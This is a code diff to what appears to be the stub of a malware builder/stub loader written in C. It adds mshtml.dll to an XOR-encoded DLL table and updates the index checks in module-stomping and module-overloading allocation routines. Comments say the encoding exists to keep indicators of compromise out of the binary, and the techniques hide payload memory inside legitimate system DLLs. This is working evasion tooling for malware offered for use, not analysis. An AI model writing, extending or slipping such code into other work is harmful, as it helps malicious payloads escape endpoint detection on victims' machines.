@@ -18,7 +18,7 @@ typedef HMODULE  (WINAPI *pfnLoadLibraryW_t)(LPCWSTR);
 typedef UINT     (WINAPI *pfnGetSystemDirectoryW_t)(LPWSTR, UINT);
 typedef HANDLE   (WINAPI *pfnCreateFileW_t)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 
-/* 10-DLL lookup table — XOR-encoded (key 0x5A) to avoid plaintext wide-string
+/* 11-DLL lookup table — XOR-encoded (key 0x5A) to avoid plaintext wide-string
  * IOCs in .rdata.  Builder stores 3 chosen indices in .rsrc; Stub decodes
  * names on demand via DecodeDllName().  No DLL name in .rsrc — only 3 bytes. */
 #define DLL_XOR_KEY 0x5Au
@@ -34,15 +34,17 @@ static const BYTE k_dll_6[] = {0x2D,0x33,0x34,0x32,0x2E,0x2E,0x2A,0x74,0x3E,0x36
 static const BYTE k_dll_7[] = {0x2D,0x2E,0x29,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36};               /* wtsapi32.dll   */
 static const BYTE k_dll_8[] = {0x2D,0x36,0x3B,0x34,0x3B,0x2A,0x33,0x74,0x3E,0x36,0x36};                    /* wlanapi.dll    */
 static const BYTE k_dll_9[] = {0x38,0x39,0x28,0x23,0x2A,0x2E,0x74,0x3E,0x36,0x36};                         /* bcrypt.dll     */
+static const BYTE k_dll_10[] = {0x37,0x29,0x32,0x2E,0x37,0x36,0x74,0x3E,0x36,0x36};                        /* mshtml.dll     */
 
 static const BYTE* const k_dll_enc[] = {
     k_dll_0, k_dll_1, k_dll_2, k_dll_3, k_dll_4,
-    k_dll_5, k_dll_6, k_dll_7, k_dll_8, k_dll_9
+    k_dll_5, k_dll_6, k_dll_7, k_dll_8, k_dll_9,
+    k_dll_10
 };
-static const BYTE k_dll_len[] = { 15, 7, 11, 9, 8, 12, 11, 12, 11, 10 };
+static const BYTE k_dll_len[] = { 15, 7, 11, 9, 8, 12, 11, 12, 11, 10, 10 };
 
 static void DecodeDllName(BYTE idx, WCHAR* buf) {
-    if (idx >= 10) { buf[0] = L'\0'; return; }
+    if (idx >= 11) { buf[0] = L'\0'; return; }
     const BYTE* src = k_dll_enc[idx];
     int len = k_dll_len[idx];
     for (int i = 0; i < len; i++) buf[i] = (WCHAR)(src[i] ^ DLL_XOR_KEY);
@@ -92,10 +94,10 @@ PVOID ModuleStomp_Alloc(SIZE_T dwSize, const BYTE dll_indices[3],
     if (!pLoadLibW) return NULL;
 
     /* Iterate over the 3 caller-supplied indices, resolving DLL names from
-     * g_DllPool at runtime.  Invalid indices (>= 10) are skipped safely. */
+     * g_DllPool at runtime.  Invalid indices (>= 11) are skipped safely. */
     for (int i = 0; i < 3; i++) {
         BYTE idx = dll_indices[i];
-        if (idx >= 10) continue;              /* guard against corrupt .rsrc */
+        if (idx >= 11) continue;              /* guard against corrupt .rsrc */
 
         WCHAR dllNameBuf[32];
         DecodeDllName(idx, dllNameBuf);
@@ -199,7 +201,7 @@ PVOID ModuleOverload_Alloc(SIZE_T dwSize, const BYTE dll_indices[3],
 
     for (int i = 0; i < 3; i++) {
         BYTE idx = dll_indices[i];
-        if (idx >= 10) continue;
+        if (idx >= 11) continue;
 
         /* Build full path:  C:\Windows\System32\<dllname>  without wcscat/wcscpy */
         WCHAR dllPath[MAX_PATH];
